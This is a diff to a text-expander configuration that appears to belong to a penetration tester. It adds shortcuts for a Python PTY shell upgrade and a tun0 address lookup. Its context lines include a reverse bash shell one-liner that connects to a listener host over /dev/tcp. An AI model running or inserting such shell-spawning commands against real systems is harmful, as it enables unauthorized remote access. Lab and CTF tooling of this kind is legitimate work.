@@ -1,6 +1,9 @@
 matches:
   # Python bash
-  - trigger: ":pypty"
+  - trigger: ":pty3"
+    replace: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+  # Python bash
+  - trigger: ":pty2"
     replace: "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
   # Stty raw
   - trigger: ":sttyraw"
@@ -8,6 +11,14 @@ matches:
   # Git push without comment
   - trigger: ":dotpush"
     replace: "git add .; git commit -m '.'; git push"
+  # IP tun0
+  - trigger: ":tunip"
+    replace: "{{LHOST}}"
+    vars:
+      - name: LHOST
+        type: shell
+        params:
+          cmd: ip a show dev tun0 | awk '/inet / {print $2}' | sed 's/\/23//'
   # Reverse bash shell
   - trigger: ":rev-bash"
     replace: "/bin/bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1"
